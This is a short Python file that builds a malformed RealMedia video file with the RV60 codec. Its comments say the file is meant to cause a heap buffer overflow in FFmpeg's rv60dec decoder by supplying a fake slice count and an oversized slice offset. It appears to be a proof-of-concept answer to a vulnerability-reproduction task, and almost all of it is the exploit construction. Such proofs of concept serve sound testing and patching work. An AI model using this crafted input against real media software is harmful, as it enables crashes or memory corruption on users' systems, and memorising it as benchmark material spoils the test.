import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a minimal RealMedia (RM) file with RV60 codec
        # to trigger Heap Buffer Overflow in avcodec/rv60dec
        
        # 1. RMF Header
        # .RMF, size 18, ver 0, file_ver 0, num_headers 1
        rmf = b'.RMF' + struct.pack('>IIII', 18, 0, 0, 1)
        
        # 2. MDPR Header (Media Properties)
        # Defines the stream as RV60.
        mime = b"video/x-pn-realvideo"
        
        # Codec Specific Data for RV60
        # 00000000 (Header/Ver), RV60 (FourCC), 0140 (Width 320), 00F0 (Height 240)
        codec_data = b'\x00\x00\x00\x00RV60\x01\x40\x00\xF0'
        
        mdpr_content = (
            struct.pack('>H', 0) +          # version
            struct.pack('>H', 0) +          # stream num
            struct.pack('>I', 0) * 7 +      # stats (max_br, avg_br, etc) - 28 bytes
            b'\x00' +                       # stream name len
            struct.pack('B', len(mime)) +   # mime len
            mime +                          # mime string
            struct.pack('>I', len(codec_data)) + # type specific len
            codec_data                      # type specific data
        )
        
        # Size includes 8 bytes of Chunk ID and Size field
        mdpr = b'MDPR' + struct.pack('>I', 8 + len(mdpr_content)) + mdpr_content
        
        # 3. DATA Chunk
        # Contains the payload.
        
        # Payload Construction:
        # Designed to simulate a frame header with multiple slices and invalid offsets.
        # The vulnerability is that the decoder calculates slice size = offset[i+1] - offset[i]
        # and initializes a get_bits context with this size without verifying it against
        # the actual buffer availability.
        payload = (
            b'\x00\x00\x00\x02' +   # Fake slice count (2)
            b'\x00\x00\x00\x10' +   # Offset 0 (16)
            b'\x7F\xFF\xFF\xFF' +   # Offset 1 (Huge value to trigger overflow in size calc)
            b'\x90' * 32            # Padding to ensure we don't hit EOF too early
        )
        
        # RM Packet Header
        packet = (
            struct.pack('>H', 0) +              # version
            struct.pack('>H', 11 + len(payload)) + # length (header 11 + payload)
            struct.pack('>H', 0) +              # stream num
            struct.pack('>I', 0) +              # timestamp
            b'\x02' +                           # flags (keyframe)
            payload
        )
        
        data_content = (
            struct.pack('>H', 0) +      # version
            struct.pack('>I', 1) +      # num packets
            struct.pack('>I', 0) +      # next data header
            packet
        )
        
        data = b'DATA' + struct.pack('>I', 8 + len(data_content)) + data_content
        
        return rmf + mdpr + data